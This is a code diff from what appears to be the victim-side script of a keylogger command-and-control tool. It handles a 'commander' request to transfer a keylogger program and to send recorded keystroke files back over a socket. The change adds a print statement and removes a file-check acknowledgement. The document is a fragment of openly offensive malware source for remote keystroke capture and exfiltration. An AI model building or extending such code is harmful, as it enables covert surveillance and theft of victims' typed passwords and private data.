@@ -94,6 +94,7 @@ if __name__ == '__main__':
 # b) Command to GET keylog program from commander
                 if data.decode() == constants.GET_KEYLOGGER_MSG:
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
+                    print(constants.CLIENT_RESPONSE.format(data.decode()))
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
 
                     # Call to receive the file data and checksum from the client
@@ -111,12 +112,7 @@ if __name__ == '__main__':
                                 break
                             file.write(data)
 
-                    # Send ACK to commander (if good)
-                    if is_file_openable(filename):
-                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
-                        client_socket.send(constants.VICTIM_ACK.encode())
-                    else:
-                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+                    print(constants.TRANSFER_SUCCESS_MSG.format(filename))
 
 
 # c) Check if data is to send recorded keystroked file to commander
